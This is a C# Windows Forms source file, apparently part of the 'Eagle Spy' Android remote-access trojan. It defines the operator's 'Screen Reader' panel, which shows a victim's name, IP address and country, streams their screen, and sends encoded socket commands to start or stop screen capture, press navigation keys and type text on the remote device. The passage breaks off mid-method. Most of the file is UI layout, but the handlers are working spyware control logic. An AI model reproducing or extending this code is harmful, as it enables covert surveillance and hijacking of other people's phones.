using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Net.Sockets;
using System.Runtime.CompilerServices;
using System.Text;
using System.Windows.Forms;
using Eagle_Spy.My.Resources;
using Eagle_Spy.sockets;
using DrakeUI.Framework;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;

namespace Eagle_Spy;

[DesignerGenerated]
public class ScreenReaderV2 : Form
{
    private IContainer components;

    [CompilerGenerated]
    [DebuggerBrowsable(DebuggerBrowsableState.Never)]
    [AccessedThroughProperty("DrakeUIButtonIcon2")]
    private DrakeUIButtonIcon _DrakeUIButtonIcon2;

    [CompilerGenerated]
    [DebuggerBrowsable(DebuggerBrowsableState.Never)]
    [AccessedThroughProperty("disablebtn")]
    private DrakeUIButtonIcon _disablebtn;

    [CompilerGenerated]
    [DebuggerBrowsable(DebuggerBrowsableState.Never)]
    [AccessedThroughProperty("enablebtn")]
    private DrakeUIButtonIcon _enablebtn;

    [CompilerGenerated]
    [DebuggerBrowsable(DebuggerBrowsableState.Never)]
    [AccessedThroughProperty("DrakeUIButtonIcon1")]
    private DrakeUIButtonIcon _DrakeUIButtonIcon1;

    [CompilerGenerated]
    [DebuggerBrowsable(DebuggerBrowsableState.Never)]
    [AccessedThroughProperty("DrakeUIButtonIcon3")]
    private DrakeUIButtonIcon _DrakeUIButtonIcon3;

    [CompilerGenerated]
    [DebuggerBrowsable(DebuggerBrowsableState.Never)]
    [AccessedThroughProperty("DrakeUIButtonIcon4")]
    private DrakeUIButtonIcon _DrakeUIButtonIcon4;

    [CompilerGenerated]
    [DebuggerBrowsable(DebuggerBrowsableState.Never)]
    [AccessedThroughProperty("presstimer")]
    private Timer _presstimer;

    [CompilerGenerated]
    [DebuggerBrowsable(DebuggerBrowsableState.Never)]
    [AccessedThroughProperty("Save")]
    private DrakeUICheckBox _Save;

    [CompilerGenerated]
    [DebuggerBrowsable(DebuggerBrowsableState.Never)]
    [AccessedThroughProperty("savetimer")]
    private Timer _savetimer;

    [CompilerGenerated]
    [DebuggerBrowsable(DebuggerBrowsableState.Never)]
    [AccessedThroughProperty("viewpic")]
    private PictureBox _viewpic;

    [CompilerGenerated]
    [DebuggerBrowsable(DebuggerBrowsableState.Never)]
    [AccessedThroughProperty("Timer1")]
    private Timer _Timer1;

    [CompilerGenerated]
    [DebuggerBrowsable(DebuggerBrowsableState.Never)]
    [AccessedThroughProperty("DrakeUIAvatar2")]
    private DrakeUIAvatar _DrakeUIAvatar2;

    [CompilerGenerated]
    [DebuggerBrowsable(DebuggerBrowsableState.Never)]
    [AccessedThroughProperty("hidetoolbtn")]
    private DrakeUIButtonIcon _hidetoolbtn;

    private bool isclick;

    private bool Swaping;

    private bool isdown;

    private List<Point> Trakpoint;

    public TcpClient Client;

    public Client ScreenClass;

    public Client classClient;

    public string DownloadsFolder;

    public string RecordName;

    public Size ScreenSize;

    public bool LIVE;

    public bool ScreenShotFoucs;

    public bool Recordit;

    public int Rnew;

    public string Title;

    private int tiks;

    [field: AccessedThroughProperty("ctrlpanel")]
    internal Panel ctrlpanel
    ;

    internal DrakeUIButtonIcon DrakeUIButtonIcon1
    ;

    internal DrakeUIButtonIcon DrakeUIButtonIcon3
    ;

    internal DrakeUIButtonIcon DrakeUIButtonIcon4
    ;

    internal Timer presstimer
;

    [field: AccessedThroughProperty("DrakeUIToolTip1")]
    internal DrakeUIToolTip DrakeUIToolTip1
    ;

    internal Timer savetimer
    ;

    [field: AccessedThroughProperty("activetext")]
    internal Label activetext
    ;

    internal PictureBox viewpic
;

    internal Timer Timer1

        ;

    [field: AccessedThroughProperty("Panel3")]
    internal Panel Panel3
    ;

    [field: AccessedThroughProperty("clinameinfo")]
    internal Label clinameinfo
    ;

    [field: AccessedThroughProperty("ClientPic")]
    internal PictureBox ClientPic
    ;

    [field: AccessedThroughProperty("keyboardpanel")]
    internal Panel keyboardpanel
    ;


    [field: AccessedThroughProperty("buttompanel")]
    internal Panel buttompanel
    ;
    private Guna.UI2.WinForms.Guna2TextBox textsend;
    internal Guna.UI2.WinForms.Guna2Button Enterbutton;
    internal PictureBox Button5;
    internal PictureBox Button7;
    internal DrakeUILabel DrakeUILabel1;
    internal PictureBox Button6;

    [DebuggerNonUserCode]
    protected override void Dispose(bool disposing)
    {
        try
        {
            if (disposing && components != null)
                components.Dispose();
        }
        finally
        {
            base.Dispose(disposing);
        }
    }

    [System.Diagnostics.DebuggerStepThrough]
    private void InitializeComponent()
    {
            this.components = new System.ComponentModel.Container();
            this.activetext = new System.Windows.Forms.Label();
            this.ctrlpanel = new System.Windows.Forms.Panel();
            this.DrakeUIButtonIcon1 = new DrakeUI.Framework.DrakeUIButtonIcon();
            this.DrakeUIButtonIcon4 = new DrakeUI.Framework.DrakeUIButtonIcon();
            this.DrakeUIButtonIcon3 = new DrakeUI.Framework.DrakeUIButtonIcon();
            this.presstimer = new System.Windows.Forms.Timer(this.components);
            this.DrakeUIToolTip1 = new DrakeUI.Framework.DrakeUIToolTip(this.components);
            this.savetimer = new System.Windows.Forms.Timer(this.components);
            this.Timer1 = new System.Windows.Forms.Timer(this.components);
            this.Panel3 = new System.Windows.Forms.Panel();
            this.clinameinfo = new System.Windows.Forms.Label();
            this.ClientPic = new System.Windows.Forms.PictureBox();
            this.keyboardpanel = new System.Windows.Forms.Panel();
            this.Button5 = new System.Windows.Forms.PictureBox();
            this.Button7 = new System.Windows.Forms.PictureBox();
            this.Button6 = new System.Windows.Forms.PictureBox();
            this.buttompanel = new System.Windows.Forms.Panel();
            this.viewpic = new System.Windows.Forms.PictureBox();
            this.textsend = new Guna.UI2.WinForms.Guna2TextBox();
            this.Enterbutton = new Guna.UI2.WinForms.Guna2Button();
            this.DrakeUILabel1 = new DrakeUI.Framework.DrakeUILabel();
            this.ctrlpanel.SuspendLayout();
            this.Panel3.SuspendLayout();
            ((System.ComponentModel.ISupportInitialize)(this.ClientPic)).BeginInit();
            this.keyboardpanel.SuspendLayout();
            ((System.ComponentModel.ISupportInitialize)(this.Button5)).BeginInit();
            ((System.ComponentModel.ISupportInitialize)(this.Button7)).BeginInit();
            ((System.ComponentModel.ISupportInitialize)(this.Button6)).BeginInit();
            this.buttompanel.SuspendLayout();
            ((System.ComponentModel.ISupportInitialize)(this.viewpic)).BeginInit();
            this.SuspendLayout();
            // 
            // activetext
            // 
            this.activetext.Font = new System.Drawing.Font("Calibri", 12F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.activetext.ForeColor = System.Drawing.Color.Lime;
            this.activetext.Location = new System.Drawing.Point(74, 646);
            this.activetext.Margin = new System.Windows.Forms.Padding(2, 0, 2, 0);
            this.activetext.Name = "activetext";
            this.activetext.Size = new System.Drawing.Size(216, 23);
            this.activetext.TabIndex = 24;
            this.activetext.TextAlign = System.Drawing.ContentAlignment.MiddleCenter;
            // 
            // ctrlpanel
            // 
            this.ctrlpanel.BackColor = System.Drawing.Color.Black;
            this.ctrlpanel.Controls.Add(this.DrakeUIButtonIcon1);
            this.ctrlpanel.Controls.Add(this.DrakeUIButtonIcon4);
            this.ctrlpanel.Location = new System.Drawing.Point(237, 557);
            this.ctrlpanel.Name = "ctrlpanel";
            this.ctrlpanel.Size = new System.Drawing.Size(36, 30);
            this.ctrlpanel.TabIndex = 2;
            // 
            // DrakeUIButtonIcon1
            // 
            this.DrakeUIButtonIcon1.Cursor = System.Windows.Forms.Cursors.Hand;
            this.DrakeUIButtonIcon1.FillColor = System.Drawing.Color.Black;
            this.DrakeUIButtonIcon1.FillHoverColor = System.Drawing.Color.FromArgb(((int)(((byte)(20)))), ((int)(((byte)(20)))), ((int)(((byte)(20)))));
            this.DrakeUIButtonIcon1.FillPressColor = System.Drawing.Color.Black;
            this.DrakeUIButtonIcon1.FillSelectedColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(5)))), ((int)(((byte)(17)))));
            this.DrakeUIButtonIcon1.Font = new System.Drawing.Font("Calibri", 12F);
            this.DrakeUIButtonIcon1.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(5)))), ((int)(((byte)(17)))));
            this.DrakeUIButtonIcon1.ForePressColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(5)))), ((int)(((byte)(17)))));
            this.DrakeUIButtonIcon1.Location = new System.Drawing.Point(129, 0);
            this.DrakeUIButtonIcon1.Name = "DrakeUIButtonIcon1";
            this.DrakeUIButtonIcon1.Radius = 10;
            this.DrakeUIButtonIcon1.RectColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(5)))), ((int)(((byte)(17)))));
            this.DrakeUIButtonIcon1.RectDisableColor = System.Drawing.Color.FromArgb(((int)(((byte)(227)))), ((int)(((byte)(242)))), ((int)(((byte)(253)))));
            this.DrakeUIButtonIcon1.RectHoverColor = System.Drawing.Color.White;
            this.DrakeUIButtonIcon1.RectPressColor = System.Drawing.Color.White;
            this.DrakeUIButtonIcon1.RectSelectedColor = System.Drawing.Color.White;
            this.DrakeUIButtonIcon1.Size = new System.Drawing.Size(57, 30);
            this.DrakeUIButtonIcon1.Style = DrakeUI.Framework.UIStyle.Custom;
            this.DrakeUIButtonIcon1.Symbol = 57353;
            this.DrakeUIButtonIcon1.TabIndex = 22;
            this.DrakeUIToolTip1.SetToolTip(this.DrakeUIButtonIcon1, "Home");
            this.DrakeUIButtonIcon1.Click += new System.EventHandler(this.DrakeUIButtonIcon1_Click);
            // 
            // DrakeUIButtonIcon4
            // 
            this.DrakeUIButtonIcon4.Cursor = System.Windows.Forms.Cursors.Hand;
            this.DrakeUIButtonIcon4.FillColor = System.Drawing.Color.Black;
            this.DrakeUIButtonIcon4.FillHoverColor = System.Drawing.Color.FromArgb(((int)(((byte)(20)))), ((int)(((byte)(20)))), ((int)(((byte)(20)))));
            this.DrakeUIButtonIcon4.FillPressColor = System.Drawing.Color.Black;
            this.DrakeUIButtonIcon4.FillSelectedColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(5)))), ((int)(((byte)(17)))));
            this.DrakeUIButtonIcon4.Font = new System.Drawing.Font("Calibri", 12F);
            this.DrakeUIButtonIcon4.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(5)))), ((int)(((byte)(17)))));
            this.DrakeUIButtonIcon4.ForePressColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(5)))), ((int)(((byte)(17)))));
            this.DrakeUIButtonIcon4.IsCircle = true;
            this.DrakeUIButtonIcon4.Location = new System.Drawing.Point(283, 0);
            this.DrakeUIButtonIcon4.Name = "DrakeUIButtonIcon4";
            this.DrakeUIButtonIcon4.Radius = 10;
            this.DrakeUIButtonIcon4.RectColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(5)))), ((int)(((byte)(17)))));
            this.DrakeUIButtonIcon4.RectDisableColor = System.Drawing.Color.FromArgb(((int)(((byte)(227)))), ((int)(((byte)(242)))), ((int)(((byte)(253)))));
            this.DrakeUIButtonIcon4.RectHoverColor = System.Drawing.Color.White;
            this.DrakeUIButtonIcon4.RectPressColor = System.Drawing.Color.White;
            this.DrakeUIButtonIcon4.RectSelectedColor = System.Drawing.Color.White;
            this.DrakeUIButtonIcon4.Size = new System.Drawing.Size(53, 27);
            this.DrakeUIButtonIcon4.Style = DrakeUI.Framework.UIStyle.Custom;
            this.DrakeUIButtonIcon4.Symbol = 61524;
            this.DrakeUIButtonIcon4.TabIndex = 23;
            this.DrakeUIToolTip1.SetToolTip(this.DrakeUIButtonIcon4, "Return");
            this.DrakeUIButtonIcon4.Click += new System.EventHandler(this.DrakeUIButtonIcon4_Click);
            // 
            // DrakeUIButtonIcon3
            // 
            this.DrakeUIButtonIcon3.Cursor = System.Windows.Forms.Cursors.Hand;
            this.DrakeUIButtonIcon3.FillColor = System.Drawing.Color.Black;
            this.DrakeUIButtonIcon3.FillHoverColor = System.Drawing.Color.FromArgb(((int)(((byte)(20)))), ((int)(((byte)(20)))), ((int)(((byte)(20)))));
            this.DrakeUIButtonIcon3.FillPressColor = System.Drawing.Color.Black;
            this.DrakeUIButtonIcon3.FillSelectedColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(5)))), ((int)(((byte)(17)))));
            this.DrakeUIButtonIcon3.Font = new System.Drawing.Font("Calibri", 12F);
            this.DrakeUIButtonIcon3.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(5)))), ((int)(((byte)(17)))));
            this.DrakeUIButtonIcon3.ForePressColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(5)))), ((int)(((byte)(17)))));
            this.DrakeUIButtonIcon3.Location = new System.Drawing.Point(117, 557);
            this.DrakeUIButtonIcon3.Name = "DrakeUIButtonIcon3";
            this.DrakeUIButtonIcon3.Radius = 10;
            this.DrakeUIButtonIcon3.RectColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(5)))), ((int)(((byte)(17)))));
            this.DrakeUIButtonIcon3.RectDisableColor = System.Drawing.Color.FromArgb(((int)(((byte)(227)))), ((int)(((byte)(242)))), ((int)(((byte)(253)))));
            this.DrakeUIButtonIcon3.RectHoverColor = System.Drawing.Color.White;
            this.DrakeUIButtonIcon3.RectPressColor = System.Drawing.Color.White;
            this.DrakeUIButtonIcon3.RectSelectedColor = System.Drawing.Color.White;
            this.DrakeUIButtonIcon3.Size = new System.Drawing.Size(101, 30);
            this.DrakeUIButtonIcon3.Style = DrakeUI.Framework.UIStyle.Custom;
            this.DrakeUIButtonIcon3.Symbol = 61641;
            this.DrakeUIButtonIcon3.SymbolSize = 20;
            this.DrakeUIButtonIcon3.TabIndex = 21;
            this.DrakeUIToolTip1.SetToolTip(this.DrakeUIButtonIcon3, "Recent");
            this.DrakeUIButtonIcon3.Click += new System.EventHandler(this.DrakeUIButtonIcon3_Click);
            // 
            // presstimer
            // 
            this.presstimer.Interval = 1000;
            this.presstimer.Tick += new System.EventHandler(this.Presstimer_Tick);
            // 
            // DrakeUIToolTip1
            // 
            this.DrakeUIToolTip1.BackColor = System.Drawing.Color.Black;
            this.DrakeUIToolTip1.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(5)))), ((int)(((byte)(17)))));
            this.DrakeUIToolTip1.OwnerDraw = true;
            this.DrakeUIToolTip1.RectColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(5)))), ((int)(((byte)(17)))));
            // 
            // savetimer
            // 
            this.savetimer.Interval = 1000;
            this.savetimer.Tick += new System.EventHandler(this.Savetimer_Tick);
            // 
            // Panel3
            // 
            this.Panel3.BackColor = System.Drawing.Color.Black;
            this.Panel3.Controls.Add(this.clinameinfo);
            this.Panel3.Controls.Add(this.ClientPic);
            this.Panel3.ForeColor = System.Drawing.Color.Red;
            this.Panel3.Location = new System.Drawing.Point(419, 0);
            this.Panel3.Margin = new System.Windows.Forms.Padding(2);
            this.Panel3.Name = "Panel3";
            this.Panel3.Size = new System.Drawing.Size(252, 24);
            this.Panel3.TabIndex = 6;
            // 
            // clinameinfo
            // 
            this.clinameinfo.BackColor = System.Drawing.Color.Transparent;
            this.clinameinfo.Font = new System.Drawing.Font("Calibri", 9F);
            this.clinameinfo.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(5)))), ((int)(((byte)(17)))));
            this.clinameinfo.Location = new System.Drawing.Point(394, 0);
            this.clinameinfo.Margin = new System.Windows.Forms.Padding(2, 0, 2, 0);
            this.clinameinfo.Name = "clinameinfo";
            this.clinameinfo.Size = new System.Drawing.Size(10, 24);
            this.clinameinfo.TabIndex = 12;
            this.clinameinfo.Text = "...";
            this.clinameinfo.TextAlign = System.Drawing.ContentAlignment.MiddleLeft;
            // 
            // ClientPic
            // 
            this.ClientPic.Dock = System.Windows.Forms.DockStyle.Left;
            this.ClientPic.Location = new System.Drawing.Point(0, 0);
            this.ClientPic.Margin = new System.Windows.Forms.Padding(2, 3, 2, 3);
            this.ClientPic.Name = "ClientPic";
            this.ClientPic.Size = new System.Drawing.Size(27, 24);
            this.ClientPic.SizeMode = System.Windows.Forms.PictureBoxSizeMode.Zoom;
            this.ClientPic.TabIndex = 11;
            this.ClientPic.TabStop = false;
            // 
            // keyboardpanel
            // 
            this.keyboardpanel.Controls.Add(this.Button5);
            this.keyboardpanel.Controls.Add(this.Button7);
            this.keyboardpanel.Controls.Add(this.Button6);
            this.keyboardpanel.Location = new System.Drawing.Point(0, 0);
            this.keyboardpanel.Margin = new System.Windows.Forms.Padding(2);
            this.keyboardpanel.Name = "keyboardpanel";
            this.keyboardpanel.Size = new System.Drawing.Size(351, 30);
            this.keyboardpanel.TabIndex = 7;
            this.keyboardpanel.Tag = "b";
            // 
            // Button5
            // 
            this.Button5.Cursor = System.Windows.Forms.Cursors.Hand;
            this.Button5.Image = global::Eagle_Spy_Applications.icons8_back_64;
            this.Button5.Location = new System.Drawing.Point(258, 2);
            this.Button5.Name = "Button5";
            this.Button5.Size = new System.Drawing.Size(32, 28);
            this.Button5.SizeMode = System.Windows.Forms.PictureBoxSizeMode.Zoom;
            this.Button5.TabIndex = 95;
            this.Button5.TabStop = false;
            this.Button5.Click += new System.EventHandler(this.Button5_Click);
            // 
            // Button7
            // 
            this.Button7.Cursor = System.Windows.Forms.Cursors.Hand;
            this.Button7.Image = global::Eagle_Spy_Applications.icons8_xbox_menu_30;
            this.Button7.Location = new System.Drawing.Point(60, 2);
            this.Button7.Name = "Button7";
            this.Button7.Size = new System.Drawing.Size(32, 28);
            this.Button7.SizeMode = System.Windows.Forms.PictureBoxSizeMode.Zoom;
            this.Button7.TabIndex = 94;
            this.Button7.TabStop = false;
            this.Button7.Click += new System.EventHandler(this.Button7_Click);
            // 
            // Button6
            // 
            this.Button6.Cursor = System.Windows.Forms.Cursors.Hand;
            this.Button6.Image = global::Eagle_Spy_Applications.icons8_stop_100;
            this.Button6.Location = new System.Drawing.Point(156, 2);
            this.Button6.Name = "Button6";
            this.Button6.Size = new System.Drawing.Size(32, 28);
            this.Button6.SizeMode = System.Windows.Forms.PictureBoxSizeMode.Zoom;
            this.Button6.TabIndex = 93;
            this.Button6.TabStop = false;
            this.Button6.Click += new System.EventHandler(this.Button6_Click);
            // 
            // buttompanel
            // 
            this.buttompanel.Controls.Add(this.keyboardpanel);
            this.buttompanel.Dock = System.Windows.Forms.DockStyle.Bottom;
            this.buttompanel.Location = new System.Drawing.Point(0, 690);
            this.buttompanel.Margin = new System.Windows.Forms.Padding(2);
            this.buttompanel.Name = "buttompanel";
            this.buttompanel.Size = new System.Drawing.Size(353, 30);
            this.buttompanel.TabIndex = 8;
            // 
            // viewpic
            // 
            this.viewpic.Location = new System.Drawing.Point(0, 47);
            this.viewpic.Margin = new System.Windows.Forms.Padding(2);
            this.viewpic.Name = "viewpic";
            this.viewpic.Size = new System.Drawing.Size(351, 614);
            this.viewpic.SizeMode = System.Windows.Forms.PictureBoxSizeMode.StretchImage;
            this.viewpic.TabIndex = 3;
            this.viewpic.TabStop = false;
            this.viewpic.MouseDown += new System.Windows.Forms.MouseEventHandler(this.PictureBox1_MouseDown);
            this.viewpic.MouseMove += new System.Windows.Forms.MouseEventHandler(this.Viewpic_MouseMove);
            this.viewpic.MouseUp += new System.Windows.Forms.MouseEventHandler(this.Viewpic_MouseUp);
            // 
            // textsend
            // 
            this.textsend.BorderColor = System.Drawing.Color.Red;
            this.textsend.BorderRadius = 5;
            this.textsend.Cursor = System.Windows.Forms.Cursors.IBeam;
            this.textsend.DefaultText = "";
            this.textsend.DisabledState.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(208)))), ((int)(((byte)(208)))), ((int)(((byte)(208)))));
            this.textsend.DisabledState.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(226)))), ((int)(((byte)(226)))), ((int)(((byte)(226)))));
            this.textsend.DisabledState.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(138)))), ((int)(((byte)(138)))), ((int)(((byte)(138)))));
            this.textsend.DisabledState.PlaceholderForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(138)))), ((int)(((byte)(138)))), ((int)(((byte)(138)))));
            this.textsend.FillColor = System.Drawing.Color.Black;
            this.textsend.FocusedState.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(94)))), ((int)(((byte)(148)))), ((int)(((byte)(255)))));
            this.textsend.Font = new System.Drawing.Font("Segoe UI", 9F);
            this.textsend.ForeColor = System.Drawing.Color.White;
            this.textsend.HoverState.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(94)))), ((int)(((byte)(148)))), ((int)(((byte)(255)))));
            this.textsend.Location = new System.Drawing.Point(23, 666);
            this.textsend.Name = "textsend";
            this.textsend.PasswordChar = '\0';
            this.textsend.PlaceholderText = "Enter text";
            this.textsend.SelectedText = "";
            this.textsend.Size = new System.Drawing.Size(293, 20);
            this.textsend.TabIndex = 99;
            // 
            // Enterbutton
            // 
            this.Enterbutton.AutoRoundedCorners = true;
            this.Enterbutton.BackgroundImageLayout = System.Windows.Forms.ImageLayout.Stretch;
            this.Enterbutton.BorderRadius = 9;
            this.Enterbutton.DisabledState.BorderColor = System.Drawing.Color.DarkGray;
            this.Enterbutton.DisabledState.CustomBorderColor = System.Drawing.Color.DarkGray;
            this.Enterbutton.DisabledState.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(169)))), ((int)(((byte)(169)))), ((int)(((byte)(169)))));
            this.Enterbutton.DisabledState.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(141)))), ((int)(((byte)(141)))), ((int)(((byte)(141)))));
            this.Enterbutton.FillColor = System.Drawing.Color.Transparent;
            this.Enterbutton.Font = new System.Drawing.Font("Segoe UI", 9F);
            this.Enterbutton.ForeColor = System.Drawing.Color.White;
            this.Enterbutton.HoverState.BorderColor = System.Drawing.Color.Aqua;
            this.Enterbutton.Image = global::Eagle_Spy_Applications.icons8_send_30;
            this.Enterbutton.Location = new System.Drawing.Point(331, 666);
            this.Enterbutton.Name = "Enterbutton";
            this.Enterbutton.Size = new System.Drawing.Size(20, 20);
            this.Enterbutton.TabIndex = 100;
            this.Enterbutton.Click += new System.EventHandler(this.Enterbutton_Click);
            // 
            // DrakeUILabel1
            // 
            this.DrakeUILabel1.Font = new System.Drawing.Font("Bahnschrift", 14.25F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.DrakeUILabel1.ForeColor = System.Drawing.Color.Red;
            this.DrakeUILabel1.Location = new System.Drawing.Point(42, 9);
            this.DrakeUILabel1.Name = "DrakeUILabel1";
            this.DrakeUILabel1.Size = new System.Drawing.Size(274, 28);
            this.DrakeUILabel1.Style = DrakeUI.Framework.UIStyle.Custom;
            this.DrakeUILabel1.TabIndex = 101;
            this.DrakeUILabel1.Text = "Screen Reader";
            this.DrakeUILabel1.TextAlign = System.Drawing.ContentAlignment.MiddleCenter;
            // 
            // ScreenReaderV2
            // 
            this.AutoScaleDimensions = new System.Drawing.SizeF(6F, 13F);
            this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
            this.BackColor = System.Drawing.Color.Black;
            this.ClientSize = new System.Drawing.Size(353, 720);
            this.Controls.Add(this.DrakeUILabel1);
            this.Controls.Add(this.Enterbutton);
            this.Controls.Add(this.textsend);
            this.Controls.Add(this.activetext);
            this.Controls.Add(this.buttompanel);
            this.Controls.Add(this.viewpic);
            this.Controls.Add(this.Panel3);
            this.Controls.Add(this.DrakeUIButtonIcon3);
            this.Controls.Add(this.ctrlpanel);
            this.ForeColor = System.Drawing.Color.Red;
            this.FormBorderStyle = System.Windows.Forms.FormBorderStyle.FixedToolWindow;
            this.Margin = new System.Windows.Forms.Padding(2);
            this.MaximumSize = new System.Drawing.Size(369, 760);
            this.MinimumSize = new System.Drawing.Size(369, 760);
            this.Name = "ScreenReaderV2";
            this.Text = "Screen Reader";
            this.Load += new System.EventHandler(this.ScreenReaderV2_Load);
            this.ctrlpanel.ResumeLayout(false);
            this.Panel3.ResumeLayout(false);
            ((System.ComponentModel.ISupportInitialize)(this.ClientPic)).EndInit();
            this.keyboardpanel.ResumeLayout(false);
            ((System.ComponentModel.ISupportInitialize)(this.Button5)).EndInit();
            ((System.ComponentModel.ISupportInitialize)(this.Button7)).EndInit();
            ((System.ComponentModel.ISupportInitialize)(this.Button6)).EndInit();
            this.buttompanel.ResumeLayout(false);
            ((System.ComponentModel.ISupportInitialize)(this.viewpic)).EndInit();
            this.ResumeLayout(false);

    }

    public ScreenReaderV2()
    {
        base.Load += ScreenReaderV2_Load;
        base.FormClosing += ScreenReaderV2_FormClosing;
        isclick = false;
        Swaping = false;
        isdown = false;
        ScreenShotFoucs = false;
        Recordit = false;
        Rnew = 0;
        Title = "null";
        tiks = 0;
        InitializeComponent();
    }

    private void ScreenReaderV2_Load(object sender, EventArgs e)
    {
        try
        {
            ClientPic.Image = classClient.Wallpaper;



            clinameinfo.Text = "Name: " + classClient.ClientName + Strings.Space(2) + "IP: " + classClient.ClientAddressIP + Strings.Space(2) + "Country: " + classClient.Country;

            if (classClient != null)
            {
                TcpClient myClient = classClient.myClient;
                string[] array = classClient.Keys.Split(':');
                object[] parametersObjects = new object[4]
                {
                myClient,
                SecurityKey.KeysClient2 + Data.SPL_SOCKET + "SCRD2<*>o" + Data.SPL_SOCKET + array[0] + Data.SPL_SOCKET + array[1] + Data.SPL_SOCKET + SecurityKey.Lockscreen + Data.SPL_SOCKET + Conversions.ToString(0) + Data.SPL_SOCKET + Conversions.ToString(0) + Data.SPL_SOCKET + Data.SPL_ARRAY + Data.SPL_SOCKET + classClient.ClientRemoteAddress,
                Codes.Encoding().GetBytes("null"),
                classClient
                };
                classClient.SendMessage(parametersObjects);
                //	enablebtn.Enabled = false;
                //	disablebtn.Enabled = true;
            }


        }

        catch (Exception)
        {
            //ProjectData.SetProjectError(projectError);
            //////CraxsAlert.Showinformation("Sorry");
        }

        //ShowTipform showTipform = new ShowTipform(RegistryHandler.ShowScrenReadTip, Resources.Tip_screenctrol);
        //string text = RegistryHandler.GET_Tip(RegistryHandler.ShowScrenReadTip);
        //bool flag = true;
        //if (text != null)
        //{
        //	if (Operators.CompareString(text, "no", TextCompare: false) == 0)
        //	flag = false;
        //}
        //else
        //	flag = true;
        //if (flag)

        //showTipform.ShowDialog();

    }
    private void Savetimer_Tick(object sender, EventArgs e)
    {
    }


    private void Presstimer_Tick(object sender, EventArgs e)
    {
        checked
        {
            tiks++;
        }
    }

    public string asab(string input)
    {
        string[] array = input.Replace("\u200b", " ").Split(' ');
        string text = "";
        string[] array2 = array;
        foreach (string text2 in array2)
        {
            if (text2.Length > 0)
                text += Conversions.ToString(Strings.Chr(Convert.ToInt32(text2)));
        }
        return text;
    }

    private void Enablebtn_Click(object sender, EventArgs e)
    {
        if (classClient != null)
        {
            TcpClient myClient = classClient.myClient;
            string[] array = classClient.Keys.Split(':');
            object[] parametersObjects = new object[4]
            {
                myClient,
                SecurityKey.KeysClient2 + Data.SPL_SOCKET + "SCRD2<*>o" + Data.SPL_SOCKET + array[0] + Data.SPL_SOCKET + array[1] + Data.SPL_SOCKET + SecurityKey.Lockscreen + Data.SPL_SOCKET + Conversions.ToString(0) + Data.SPL_SOCKET + Conversions.ToString(0) + Data.SPL_SOCKET + Data.SPL_ARRAY + Data.SPL_SOCKET + classClient.ClientRemoteAddress,
                Codes.Encoding().GetBytes("null"),
                classClient
            };
            classClient.SendMessage(parametersObjects);
            //	enablebtn.Enabled = false;
            //	disablebtn.Enabled = true;
        }
    }

    private void DrakeUIButtonIcon2_Click(object sender, EventArgs e)
    {
        viewpic.Image = Codes.BlankImage();
    }

    private void Disablebtn_Click(object sender, EventArgs e)
    {
        if (classClient != null)
        {
            TcpClient myClient = classClient.myClient;
            string[] array = classClient.Keys.Split(':');
            object[] parametersObjects = new object[4]
            {
                myClient,
                SecurityKey.KeysClient2 + Data.SPL_SOCKET + "SCRD2<*>f" + Data.SPL_SOCKET + array[0] + Data.SPL_SOCKET + array[1] + Data.SPL_SOCKET + SecurityKey.Lockscreen + Data.SPL_SOCKET + Conversions.ToString(0) + Data.SPL_SOCKET + Conversions.ToString(0) + Data.SPL_SOCKET + Data.SPL_ARRAY + Data.SPL_SOCKET + classClient.ClientRemoteAddress,
                Codes.Encoding().GetBytes("null"),
                classClient
            };
            classClient.SendMessage(parametersObjects);
            //enablebtn.Enabled = true;
            //disablebtn.Enabled = false;
        }
    }

    private void DrakeUIButtonIcon4_Click(object sender, EventArgs e)
    {
        if (classClient != null)
            try
            {
                string[] array = classClient.Keys.Split(':');
                object[] parametersObjects = new object[4]
                {
                    classClient.myClient,
                    SecurityKey.KeysClient2 + Data.SPL_SOCKET + "sp<*>Bc" + Data.SPL_SOCKET + array[0] + Data.SPL_SOCKET + array[1] + Data.SPL_SOCKET + SecurityKey.Lockscreen + Data.SPL_SOCKET + Conversions.ToString(0) + Data.SPL_SOCKET + Conversions.ToString(0) + Data.SPL_SOCKET + Data.SPL_ARRAY + Data.SPL_SOCKET + classClient.ClientRemoteAddress,
                    Codes.Encoding().GetBytes("null"),
                    classClient
                };
                classClient.SendMessage(parametersObjects);
            }
            catch (Exception)
            {
                //ProjectData.SetProjectError(projectError);
                //////CraxsAlert.Showinformation("Sorry");
            }
    }

    private void DrakeUIButtonIcon1_Click(object sender, EventArgs e)
    {
        if (classClient != null)
            try
            {
